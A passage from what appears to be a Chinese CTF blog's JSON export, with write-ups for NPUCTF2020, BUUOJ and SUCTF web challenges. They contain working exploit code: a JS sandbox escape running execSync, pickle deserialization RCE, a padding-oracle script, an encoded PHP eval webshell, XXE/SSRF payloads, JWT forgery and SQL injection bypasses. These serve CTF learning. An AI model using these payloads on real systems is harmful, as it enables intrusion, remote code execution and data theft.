嘿嘿，给爪⑧\rkeys\r}));\rObject.freeze(Object);\rObject.freeze(Math);\rapp.post('/', function (req, res) {\rlet result = '';\rconst results = req.session.results || [];\rconst { e, first, second } = req.body;\rif (first \u0026\u0026 second \u0026\u0026 first.length === second.length \u0026\u0026 first!==second \u0026\u0026 md5(first+keys[0]) === md5(second+keys[0])) {\rif (req.body.e) {\rtry {\rresult = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';\r} catch (e) {\rconsole.log(e);\rresult = 'Wrong Wrong Wrong!!!';\r}\rresults.unshift(`${req.body.e}=${result}`);\r}\r} else {\rresults.unshift('Not verified!');\r}\rif (results.length \u003e 13) {\rresults.pop();\r}\rreq.session.results = results;\rres.send(render(req.session.results));\r});\r// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI\rapp.get('/source', function (req, res) {\rres.set('Content-Type', 'text/javascript;charset=utf-8');\rres.send(fs.readFileSync('./index.js'));\r});\rapp.get('/', function (req, res) {\rres.set('Content-Type', 'text/html;charset=utf-8');\rreq.session.admin = req.session.admin || 0;\rres.send(render(req.session.results = req.session.results || []))\r});\rapp.listen(80, '0.0.0.0', () =\u003e {\rconsole.log('Start listening')\r});\r第一层45行，first \u0026\u0026 second \u0026\u0026 first.length === second.length \u0026\u0026 first!==second \u0026\u0026 md5(first+keys[0]) === md5(second+keys[0])要求first和second长度相同，值不同，然后经过加盐之后值完全相同，一般这种看到就知道是弱类型，在susecctf上面遇见过，盐是字符串，当拼接的时候，first和second都会被转化为字符串，那么我们可以传入\nfirst='1' second=[1]\r但是urlencode没办法传递数组，第31行恰巧提示了可以接受json形式的数据，那么我们就可以传入json：\nContent-Type: application/json\r{\"e\":\"1+1\",\"first\":\"1\",\"second\":[1]}\r我们可以看到1+1被执行了；\n第二层，17行， if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/\u0026|^%\u003c\u003e=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) 这句话意思大概是，e的值只能 是 Math.xxxxx 。符号只能出现 ()+\\-*\u0026|%^\u003c\u003e=,?: 。\n由于=\u003e的存在，我们得以使用JS的箭头函数，大概是这个意思：\nx =\u003e x*x\r等价于\rfunction (x){\rreturn x*x;\r}\r我们对照着playload一步步看：\n(Math=\u003e\r(Math=Math.constructor,\rMath.x=Math.constructor(\rMath.fromCharCode(114,101,116,117,114,110,32,112,114,111,\r99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,\r46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,\r95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,\r121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()\r)\r)(Math+1)\r最外层的是\n(Math=\u003e(xxxxx)())(Math+1)\r最外面的小括号是JS立即执行的函数，否则你就只是单单定义了function (Math){}这个函数。\n开头的Math是函数接受的参数也就是形参，xxxxx是函数体，(Math+1)是实际传入的参数\n接下来我们看他的函数体xxxxx干了些什么；\n举个例子：\nMath=Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))\r可以看到，这里定义了Math，把传入的Math的constructor属性赋值\n具体是什么意思呢？这里是利用了JS的原型链：\n 一开始Math并没有定义，如果我们直接传入Match，那么会是object，而payload中传入的是Math+1，此时类型就变成了object1。object对象和字符串进行拼接。那么会转换为string类型 为了清楚，我们重写下代码：  test=Math.constructor //传入的Math是string，返回string类型的原型，String[function String()]\rtest2=test.constructor //返回string原型的原型，Function[funciton Function]\r 也就是通过一个 object1 从原型链上获取了String和Function两种类型  回到题目，\n#fromCharCode函数必须是在String类型上用，也就是String.fromCharCode()\rMath=Math.constructor\r#定义了string类型\rMath=Math.construtor\r#定义了function类型\rMath.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()\r等同于\rfunction(string.fromCharCode(xxxxxxxxx)()\rexp中fromCharCode里面解码是：\nreturn process.mainModule.require('child_process').execSync('cat /flag').toString()\r相当于我们执行了：\nfunction(\rreturn process.mainModule.require('child_process').execSync('cat /flag').toString()\r)()\rflag{7683e76d-e61e-4b5a-bca0-3ad38bfa27a0}\nezinclude 考点：MD5哈希长度拓展攻击（疑似）、PHP7利用php Segfault包含保存的临时文件\n打开题目，源代码里面有提示：\u003c!--md5($secret.$name)===$pass --\u003e 疑似MD5哈希长度拓展攻击，不过在响应包里面给出啦pass的值，可能是出题出翻车了\n得到了 flflflflag.php ，访问重定向到了其他页面，抓包抓回来，页面提示 include($_GET[\"file\"]) ，扫目录可以得到 dir.php ,包含他可以看到这个页面列出了 /tmp 下的所有文件\n这里考察的是PHP临时文件包含，其基本是两种情况：\n 利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除 PHP版本\u003c7.2，利用php崩溃留下临时文件  贴一篇：\u003e\u003eLFIroRCE总结\n\u003e\u003e文件包含\u0026奇技淫巧\n这里就不累述了，直接上脚本：\nimport requests\rfrom io import BytesIO\rpayload = \"\u003c?php phpinfo()?\u003e\"\rfile_data = {\r'file': BytesIO(payload.encode())\r}\rurl = \"http://35869f0e-43e6-47db-a026-b77fdfed3fea.node3.buuoj.cn/flflflflag.php?\"\\\r+\"file=php://filter/string.strip_tags/resource=/etc/passwd\"\rr = requests.post(url=url, files=file_data, allow_redirects=False)\r然后访问 dir.php 可以得到临时文件的名称，包含之即可RCE\nflag就在phpinfo页面\nflag{2ac28208-c35f-426b-bca5-4f50a77e1203}\n","description":"西工大举办的比赛，难度非常顶","tags":["NodeJS","WebCrypto","临时文件包含"],"title":"NPUCTF2020_wp","uri":"/posts/npuctf2020_wp/"},{"categories":["note"],"content":"前言 在西工大举办的NPUCTF2020上面做到一道webcrypto的题，以前从来没接触过密码安全方向，这次正好学一下入个门\n正文 参考\nPadding Oracle Attack：\n《白帽子讲web安全》P239\n\u003e\u003e一叶飘零师傅\nCBC翻转攻击：\n\u003e\u003e某师傅\n\u003e\u003e某某师傅\n先来讲一讲CBC模式加密原理：\n 首先将明文（Plaintext）分组(常见的以16或8字节为一组)，位数不足的使用特殊字符填充。 生成一个随机的初始化向量(IV)和一个密钥。 将IV和第一组明文异或（xor运算）。 用密钥对3中xor后产生的密文加密。 用4中产生的密文对第二组明文进行xor操作。 用密钥对5中产生的密文加密。 重复4-7，到最后一组明文。 将IV和加密后的密文拼接在一起，得到最终的密文  解密过程：\n 先从密文中取出IV，然后对剩下的密文分组（16或8字节为一组） 使用秘钥解密第一组密文，将解密结果与IV做异或运算，得到明文1 然后使用秘钥解第二组密文，将解密的结果与上一组密文进行异或运算，得出明文2 重复2-3，直至所有密文解密完毕  以上就是CBC模式的加密解密过程，接下来讲两种手段：\nPadding Oracle Attack 直译为 “填充Oracle攻击” ，这里主要关注一下解密过程：\n密文cipher首先进行一系列处理，如图中的Block Cipher Decryption 我们将处理后的值称为 middle 中间值 然后 middle 与我们输入的iv进行异或操作 得到的即为明文 但这里有一个规则叫做Padding填充： 因为加密是按照16位一组分组进行的 而如果不足16位，就需要进行填充\n有几个空，就要填充几个“几”\n比如明文为admin，那么需要填充的就是 admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b （11个\\x0b）\n如果我们输入一个错误的iv，依旧是可以解密的，但是 middle 和我们输入的iv经过异或后得到的填充值可能出现错误\n比如本来应该是 admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b 而我们错误的得到 admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x3b\\x2c\n这样解密程序往往会抛出异常(Padding Error)\n应用在web里的时候，往往是302或是500报错 而正常解密的时候是200 所以这时，我们可以根据服务器的反应来判断我们输入的iv\n看例子：\n我们假设middle中间值为：\n0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d\r正确的解密iv应该为\n0x6d 0x36 0x70 0x76 0x03 0x6e 0x22 0x39\r解密后正确的明文为：\nT E S T 0x04 0x04 0x04 0x04\r但是关键点在于，我们可以知道iv的值，却不能得到中间值和解密后明文的值 而我们的目标是只根据我们输入的iv值和服务器的状态去判断出解密后明文的值 这里的攻击即叫做 Padding Oracle Attack 攻击 这时候我们选择进行爆破攻击\n如果我们构造一个iv为：\n0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\r那么 middle 的值和这个iv异或将会得到原封不动的 middle 的值\n0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d\r现在这个解密结果是不对的\n正确的 padding 值只可能是：\n 1个字节的padding为0x01 2个字节的padding为0x02，0x02 3个字节的padding为0x03，0x03，0x03 4个字节的padding为0x04，0x04，0x04，0x04 ……  因此我们希望慢慢调整iv的值，并且希望解密后最后一个值为正确的 padding 比如一个0x01，我们于是遍历最后一位iv：\n那么最后一位中间密文就是： 0x01^0x3C=0x3D （这个一定成立，看图）,原来的明文就是 0x3D^0x0F=0x32（中间密文^原来的iv）\n知道了最后一位的中间密文，就可以遍历倒数第二位iv了，这个时候应该为 0x02 而非 0x01 了。看图就懂：\n以此类推，我们可以就能推算所有中间密文，再用 中间密文^原来的iv 就能算出明文了\nCBC字节翻转攻击 有了上面的CBC加密解密过程的基础，这个手段其实很容易理解；\n由解密算法可知：\nA=B^C\r由 ^ 运算的性质我们可以知道：\nA=B^C、B=A^C、C=A^B\r这是最关键的一点，我们可以推导出三者做异或运算的结果是0\nC=A^B\rC^C=A^B^C=0\r我们修改了B的值，就一定会影响到A\nB^X^C=A^X\r也就是说，我们只要给B异或了X，A的值也会改变为他之前的值异或X的结果\n一 道CTF的例子 NPUCTF2020_web🐕\n我摊牌了，就是懒得写前端\r\u003c?php error_reporting(0);\rinclude('config.php'); # $key,********$file1*********\rdefine(\"METHOD\", \"aes-128-cbc\"); //定义加密方式\rdefine(\"SECRET_KEY\", $key); //定义密钥\rdefine(\"IV\",\"6666666666666666\"); //定义初始向量 16个6\rdefine(\"BR\",'\u003cbr\u003e');\rif(!isset($_GET['source']))header('location:./index.php?source=1');\r#var_dump($GLOBALS); //听说你想看这个？\rfunction aes_encrypt($iv,$data)\r{\recho \"--------encrypt---------\".BR;\recho 'IV:'.$iv.BR;\rreturn base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;\r}\rfunction aes_decrypt($iv,$data)\r{\rreturn openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die('False'); #不返回密文，解密成功返回1，解密失败返回False\r}\rif($_GET['method']=='encrypt')\r{\r$iv = IV;\r$data = $file1; echo aes_encrypt($iv,$data);\r} else if($_GET['method']==\"decrypt\")\r{\r$iv = @$_POST['iv'];\r$data = @$_POST['data'];\recho aes_decrypt($iv,$data);\r}\recho \"我摊牌了，就是懒得写前端\".BR;\rif($_GET['source']==1)highlight_file(__FILE__);\r?\u003e\rpadding Oracle Attack\nexp：\n# coding:utf-8\rimport requests\rimport base64\r# b'\\x97.\\xda\\xb8\\xa5P\\t\\x95\\xae\\x9b\\xf5\\xbf\\xe2\\x8b.\u003c'\rCYPHERTEXT = base64.b64decode(\"ly7auKVQCZWum/W/4osuPA==\")\r# initialization vector\rIV = \"6666666666666666\"\r# PKCS7 16个字节为1组\rN = 16\r# intermediaryValue ^ IV = plainText\rinermediaryValue = \"\"\rplainText = \"\"\r# 爆破时不断需要更改的iv\riv = \"\"\rURL = \"http://webdog.popscat.top/index.php?method=decrypt\u0026source=1\"\rdef xor(a, b):\r\"\"\"\r用于输出两个字符串对位异或的结果\r\"\"\"\rreturn \"\".join([chr(ord(a[i]) ^ ord(b[i])) for i in range(len(a))])\rfor step in range(1, N + 1):\rpadding = chr(step) * (step - 1)\rprint(step,end=\",\")\rfor i in range(0, 256):\rprint(i)\r\"\"\"\riv由三部分组成：\r待爆破位置 chr(0)*(N-step) 正在爆破位置 chr(i) 使 iv[N-step+1:] ^ inermediaryValue = padding 的 xor(padding,inermediaryValue)\r\"\"\"\riv = chr(0)*(N-step)+chr(i)+xor(padding,inermediaryValue)\rdata = {\r\"data\": \"ly7auKVQCZWum/W/4osuPA==\",\r\"iv\": iv\r}\rr = requests.post(URL,data = data)\rif r.text !=\"False\":\rinermediaryValue = xor(chr(i),chr(step)) + inermediaryValue\rprint(inermediaryValue)\rbreak\rplainText = xor(inermediaryValue,IV)\rprint(plainText)\r运行，得到 FlagIsHere.php 访问之，得到如下源码：\nF7LMTk/3nKSVUoSQuOS/dA==\r\u003c?php #error_reporting(0);\rinclude('config.php'); //**************$file2********last step!!\rdefine(\"METHOD\", \"aes-128-cbc\");\rdefine(\"SECRET_KEY\", \"6666666\");\rsession_start();\rfunction get_iv(){ //生成随机初始向量IV\r$random_iv='';\rfor($i=0;$i\u003c16;$i++){\r$random_iv.=chr(rand(1,255));\r}\rreturn $random_iv;\r}\r$lalala = 'piapiapiapia';\rif(!isset($_SESSION['Identity'])){\r$_SESSION['iv'] = get_iv();\r$_SESSION['Identity'] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION['iv']));\r}\recho base64_encode($_SESSION['iv']).\"\u003cbr\u003e\";\rif(isset($_POST['iv'])){\r$tmp_id = openssl_decrypt(base64_decode($_SESSION['Identity']), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST['iv']));\recho $tmp_id.\"\u003cbr\u003e\";\rif($tmp_id ==='weber')die($file2);\r}\rhighlight_file(__FILE__);\r?\u003e\r整理一下已知信息：\niv=\rF7LMTk/3nKSVUoSQuOS/dA==\r\\x17 \\xb2 \\xcc \\x4e \\x4f \\xf7 \\x9c \\xa4 \\x95 \\x52 \\x84 \\x90 \\xb8 \\xe4 \\xbf \\x74 加密后：\r$Identity='MLvuYeH07rhiAa5NJ1p75A=='\r$Identity='\\x30 \\xbb \\xee \\x61 \\xe1 \\xf4 \\xee \\xb8 \\x62 \\x01 \\xae \\x4d \\x27 \\x5a \\x7b \\xe4 '\r目的就是传入新的iv对identity进行解密，如果解密结果为'weber'那么就爽歪歪，这里考察的就是CBC字节翻转攻击\n和Padding Oracle Attack不一样，这里不需要推测中间密文，根据我上面说的\nB^X^C=A^X\r本来是 piapiapiapia\\x04\\x04\\x04\\x04 现在我们需要改为 weber\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B ，就拿第一位来说：\n我们想要把 p 改为 w ，那么我就要找出 X 的值， 'p'^X='w' 很容易算出 X='p'^'w' 那么我们只需要在将B异或一个 ('p'^'w') ，就可以达到目的。\n不过当时比赛的时候平台被D了，我是在出题人的学生机上面跑，脚本应该没问题，但是跑不出来，换了正常环境iv又不一样懒得重写，所以用了学长的脚本：\nimport base64\rdef bxor(b1, b2): # use xor for bytes\rparts = []\rfor b1, b2 in zip(b1, b2):\rparts.append(bytes([b1 ^ b2]))\rreturn b''.join(parts)\riv = base64.b64decode(\"h34HL5RbMPw8oTaQ+P58nw==\")\rtext = b\"piapiapiapia\\x04\\x04\\x04\\x04\"\rresult = b\"weber\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\"\rmiddle = bxor(iv,text)\riv = bxor(middle,result)\rprint(base64.b64encode(iv))\r跑出来POST一个iv过去得到一个网址： https://c-t.work/s/034d3b3bf3fb48||verification code:2q2hwm\n好像是有个附件，下载来是一个xxx.class文件考的Java反编译。。。不过百度能搜到，用工具 jd-gui-1.4.0 一下就跑出来。\n得到数组，就是flag的ASCII码\nq = [102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125]\rfor i in q:\rprint(chr(i), end='')\rflag{we6_4og_1s_e4syg0ing}\n","description":"由NPUCTF 2020一道题学习Padding Oracle Attack和CBC字节翻转攻击","tags":["WebCrypto"],"title":"Padding Oracle Attack\u0026CBC字节翻转攻击","uri":"/posts/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"},{"categories":["ctf_writeup"],"content":"在网上看到一道CTF题目：https://ctf.show/challenges#web9\n打开后扫目录发现robots.txt，里面提示了index.phps，下载，审计，发现MD5哈希注入：\n\u003c?php\r$flag=\"\";\r$password=$_POST['password'];\rif(strlen($password)\u003e10){\rdie(\"password error\");\r}\r$sql=\"select * from user where username ='admin' and password ='\".md5($password,true).\"'\";\r$result=mysqli_query($con,$sql);\rif(mysqli_num_rows($result)\u003e0){\rwhile($row=mysqli_fetch_assoc($result)){\recho \"登陆成功\u003cbr\u003e\";\recho $flag;\r}\r}\r?\u003e\r问题出在第7行md5($password,true)，密码使用了 md5 以二进制形式加密后进行在数据库中进行查询，若查询到了数据，就返回成功。\n第一种方法是将加密后的密码构造出类似 ' or '1' 的形式\n\u003c?php\r$v = 'a';\r$payload2 = \"'or'\";\rwhile(1){\r$hash = hash(\"md5\",$v,true);\rif(substr_count($hash, $payload2) == 1){\rdie($v); }\r$v++;\r}\r?\u003e\r这是网上的脚本不过我倒是没跑出来。。。\n这里 $v++ 其实是按照 ascii 字符进行后移的；\n最后可以得到一个结果 ffifdyop，（还有一个是129581926211651571912466741651878684928）\n将这个加密回去试试，看到确实是'or'的形式\n那么只要我们随意输入一个用户名，密码为 ffifdyop 那么这样我们的语句就变成了：\nselect * from users where user = 'admin' and password = ''or'6蒥欓!r,b\u001c'\r这样就可成功绕过判断。\n还有一个构造的方法是构造 '=' 的形式，也就是\nselect * from users where user = 'admin' and password = ''=''\r为什么这样构造可以呢？因为 password = ''='' 中，先判断 password ='' ，这个肯定是返回 0 的，因为 password 中没有''这个字段值，前面返回 0 以后，再和后面的等号做比较：0 = ''\n因为后面的根据 php 的弱类型进行判断，0 和字符串比较始终返回 1\n所以整个 sql 语句就相当于：\nselect * from users where user = 'admin' and 1\r所以与上面的 'or' 不同的是，这个需要传入一个存在的用户名才可以正常绕过：\n//by wh1sper\r\u003c?php\r$v = 'a';\r//die(md5('kydba',true));\r$payload2 = \"'='\";\rwhile(1){\r$hash = hash(\"md5\",$v,true);\rif(preg_match(\"/^$payload2/i\", $hash)){\rdie($v);\r}\r$v++;\r}\r得到结果是kydba，加密回去是'='NJ��s��5�z��@\nflag{9e92802a-684e-4115-bbe8-f3fdbbf71339}\n","description":"","tags":["SQLi"],"title":"MD5哈希注入","uri":"/posts/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/"},{"categories":["ctf_writeup"],"content":"[CISCN2019 华北赛区 Day1 Web2]ikun 考点：简单python脚本、逻辑漏洞、JWT破解与伪造、python反序列化\n页面源码里面提示脑洞比较大，给了提示，如上图\n目的是要买到LV6的东西，下面则是500页的商品，需要我们自行寻找。\n在源码里面看到，每个商品的图片就是lv?.png那么我们推测lv6.png一定存在于某一页。\n写一个脚本找找：\n#by wh1sper\rimport requests\rhost = 'http://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page='\rfor i in range(1,500):\rr = requests.get(url=host+str(i))\rif 'lv6.png' in r.text:\rprint('page = ', i)\rbreak\r得到181，访问之：\nhttp://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page=181\r不出预料的买不起。。。\n但是我们回头去看burp里面的数据包，发现请求体里面有一个键名为discount=0.8，改成discount=0.00000000001试试，果然可以，成功购买了lv6，页面重定向到 /b1g_m4mber 不过提示这个页面只能admin才能访问。于是我们又回过头去看请求头，发现cookie里面有一个东西叫做JWT（Json Web Token）\nJWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58\r附上爆破工具GitHub地址：https://github.com/brendan-rius/c-jwt-cracker\nroot@kali:~/tools/JWTcrake/c-jwt-cracker-master# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58\rSecret is \"1Kun\"\rroot@kali:~/tools/JWTcrake/c-jwt-cracker-master#\r在https://jwt.io/这个网站可以进行伪造，把身份改成admin。\n我们就可以愉快的进行伪造了，打开F12-\u003eapplication-\u003ecookie,将JWT值改成：\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo\r刷新之后我们就是admin啦~\nctrl+U查看源码，提示了/static/asd1f654e683wq/www.zip网站源码，\n下载下来，发现是python的tornado框架编写的后端\n在/sshop/views/Admin.py里面发现了python反序列化漏洞：\n#by wh1sper\r#Admin.py\rimport tornado.web\rfrom sshop.base import BaseHandler\rimport pickle\rimport urllib\rclass AdminHandler(BaseHandler):\r@tornado.web.authenticated\rdef get(self, *args, **kwargs):\rif self.current_user == \"admin\":\rreturn self.render('form.html', res='This is Black Technology!', member=0)\relse:\rreturn self.render('no_ass.html')\r@tornado.web.authenticated\rdef post(self, *args, **kwargs):\rtry:\rbecome = self.get_argument('become')\rp = pickle.loads(urllib.unquote(become))\rreturn self.render('form.html', res=p, member=1)\rexcept:\rreturn self.render('form.html', res='This is Black Technology!', member=0)\r第21行pickle.loads函数存在python反序列化漏洞\npython中的类有一个__reduce__方法，类似与PHP中的__wakeup__，在反序列化的时候会自动调用。\n reduce它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。 这个元组包含2到5个元素，其中包括： 一个可调用的对象，用于重建对象时调用； 一个参数元素，供那个可调用对象使用； 被传递给 setstate 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）  看一个例子：\nimport pickle\rimport os\rclass A(object):\rdef __reduce__(self):\rreturn (os.system,('ls',))\ra = A()\rtest = pickle.dumps(a)\rpickle.loads(test)\r命令会被执行；\n那么嫖一个exp：\n#python2\r# coding=utf8\rimport pickle\rimport urllib\rimport commands\rclass payload(object):\rdef __reduce__(self):\r#return (commands.getoutput,('ls /',))\rreturn (commands.getoutput,('tac /flag.txt',))\ra = payload()\rprint urllib.quote(pickle.dumps(a))\rpy2跑一下得到：\nccommands%0Agetoutput%0Ap0%0A%28S%27tac%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.\r抓包改become=（上面的），可以RCE\nflag{922dd06c-d1e7-4550-b9fd-80332ff3bb87}\n[MRCTF2020]套娃 考点：PHP把.解析为_、JSfuck、data://协议的使用、逆向php算法\n打开题目，源码里面提示：\n$query = $_SERVER['QUERY_STRING'];\rif( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\rdie('Y0u are So cutE!');\r}\rif($_GET['b_u_p_t'] !== '23333' \u0026\u0026 preg_match('/^23333$/', $_GET['b_u_p_t'])){\recho \"you are going to the next ~\";\r}\r传值：?b.u.p.t=23333%0A，提示访问secrettw.php 访问之后源码给了JSfuck，复制到控制台运行下得到“POST ME Merak”，post一个键名为Merak的任意值，得到源码：\nFlag is here~But how to get it? \u003c?php error_reporting(0); include 'takeip.php';\rini_set('open_basedir','.'); include 'flag.php';\rif(isset($_POST['Merak'])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = ''; for($i=0;$i\u003cstrlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; }\recho 'Local access only!'.\"\u003cbr/\u003e\";\r$ip = getIp();\rif($ip!='127.0.0.1')\recho \"Sorry,you don't have permission! Your ip is :\".$ip;\rif($ip === '127.0.0.1' \u0026\u0026 file_get_contents($_GET['2333']) === 'todat is a happy day' ){\recho \"Your REQUEST is:\".change($_GET['file']);\recho file_get_contents(change($_GET['file'])); }\r?\u003e\rfile_get_contents($_GET['2333'])需要使用data协议，然后逆向上面的函数就行了\n?2333=data://text/plain,todat+is+a+happy+day\u0026file=ZmpdYSZmXGI=\r这是脚本：\n\u003c?php\rfunction change($v){\r$v = base64_decode($v);\r$re = '';\rfor($i=0;$i\u003cstrlen($v);$i++){\r$re .= chr ( ord ($v[$i]) + $i*2 );\r}\recho $re;\r}\rfunction re($re){\r$v = '';\rfor($i = 0; $i \u003c strlen($re); $i ++){\r$v .= chr( ord($re[$i]) - $i*2);\r}\recho base64_encode($v),' ';\rreturn base64_encode($v);\r}\rre('flag.php');\rchange(re('flag.php'));//验证\rflag{4a0b1480-dcfa-4f59-aa4b-9db551ec653e}\n[极客大挑战 2019]RCE ME 考点：php异或取反绕过正则、绕过disable_functions执行命令\n先贴一篇：\u003e\u003ePHP绕过正则的办法\n本来是比较难的一道题，看了wp做的，可以工具一把梭也可以手撸\n送源码：\n\u003c?php\rerror_reporting(0);\rif(isset($_GET['code'])){\r$code=$_GET['code'];\rif(strlen($code)\u003e40){\rdie(\"This is too Long.\");\r}\rif(preg_match(\"/[A-Za-z0-9]+/\",$code)){\rdie(\"NO.\");\r}\r@eval($code);\r}\relse{\rhighlight_file(__FILE__);\r}\r// ?\u003e\r看似很简单，其实学问多，\n传入?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();\u0026%ff=phpinfo可查看phpinfo；\n能看到有很多disable_functions，版本为PHP7\n构造shell连接蚁剑：\n\u003c?php error_reporting(0);\r$a='assert';\r$b=urlencode(~$a);\recho $b;\recho \"\u003cbr\u003e\";\r$c='(eval($_POST['aaa']))';\r$d=urlencode(~$c);\recho $d;\r?\u003e\r得到：\n%9E%8C%8C%9A%8D%8B\r%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%9E%A2%D6%D6\rplayload\nhttp://3494239d-8b3b-438f-9f91-21df2d0ffd65.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%9E%A2%D6%D6);\r密码aaa\r可以得到一个不能执行命令的shell，\n利用蚁剑的插件“绕过disable_functions”的PHP7_GC_UAF即可执行命令，运行根目录下的readflag就行\nflag{a7900948-cbea-429d-972b-a959c52771be}\n[NCTF2019]True XML cookbook 考点：XXE外部实体注入攻击、SSRF\n吊把吊教我打web的🐏出的题，二刷的时候感觉自己今非昔比（大雾\n\u003e\u003e一篇文章带你理解XXE\n这是签到题的升级版，本来是通过XXE读/flag文件的，升级版提示了“尝试用xxe做更多的事情”\n读取/etc/hosts和/proc/net/arp\n\u003c?xml version=\"1.0\"?\u003e\r\u003c!DOCTYPE abc [\r\u003c!ENTITY abc SYSTEM \"/proc/net/arp\"\u003e\r]\u003e\r\u003cuser\u003e\u003cusername\u003e\u0026abc;\u003c/username\u003e\u003cpassword\u003e2\u003c/password\u003e\u003c/user\u003e\r得到返回信息：\n\u003cresult\u003e\u003ccode\u003e0\u003c/code\u003e\u003cmsg\u003eIP address HW type Flags HW address Mask Device\r173.56.246.2 0x1 0x2 02:42:ad:38:f6:02 * eth0\r\u003c/msg\u003e\u003c/result\u003e\r不过原题是给了很多在一个C段下的ip，buu里面只给了两个。\n然后可以通过xxe进行ssrf，这里可以用intruder进行C段爆破，最后是在173.56.246.10找到了flag\n\u003c?xml version=\"1.0\"?\u003e\r\u003c!DOCTYPE abc [\r\u003c!ENTITY abc SYSTEM \"php://filter/read=convert.base64-encode/resource=http://173.56.246.10/\"\u003e\r]\u003e\r\u003cuser\u003e\u003cusername\u003e\u0026abc;\u003c/username\u003e\u003cpassword\u003e2\u003c/password\u003e\u003c/user\u003e\r\u003cresult\u003e\u003ccode\u003e0\u003c/code\u003e\u003cmsg\u003eZmxhZ3s4MGYzNGNhOS1kYmUxLTRmZWUtYjEyMi00Njk0NWRmYTQ1NGN9\u003c/msg\u003e\u003c/result\u003e\rflag{80f34ca9-dbe1-4fee-b122-46945dfa454c}\n","description":"","tags":["JWT","python反序列化"],"title":"BUUOJ刷题记录(2)","uri":"/posts/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"},{"categories":["ctf_writeup"],"content":"[SUCTF 2019]EasySQL 考点：堆叠注入、MySQL中sql_mode参数\n题目存在过滤，尝试之后发现可以通过0 || 1这样的语句进行bool盲注，但是此题似乎限制了输入信息的长度，所以这个盲注只能注出来库名CTF后面的东西就没办法搞，后来看了wp之后才知道存在堆叠注入，尝试之：\n1;\r并没有报错，而且返回了查询成功额页面，所以存在堆叠注入\n1;show databases;\r返回\nArray ( [0] =\u003e 1 ) Array ( [0] =\u003e ctf ) Array ( [0] =\u003e ctftraining ) Array ( [0] =\u003e information_schema ) Array ( [0] =\u003e mysql ) Array ( [0] =\u003e performance_schema ) Array ( [0] =\u003e test )\r表名：\n1;show tables;\r返回：\nArray ( [0] =\u003e 1 ) Array ( [0] =\u003e Flag )\r但是flag关键字被过滤了，\n这就没办法直接查到flag的信息。\n由官方wp的解释来看，这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于，其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用。\n给出的查询语句是：select $_POST[query] || flag from flag\n预期解是：\n1;set sql_mode=pipes_as_concat;select 1\r然后有一个非预期是：\n*,1\rflag{05c299f9-2a8b-440e-98d1-d528859be168}\n这里说明一下：\nsql_mode 是一组mysql支持的基本语法及校验规则 查询当前系统sql_mode的设置:\n其中：\nPIPES_AS_CONCAT： 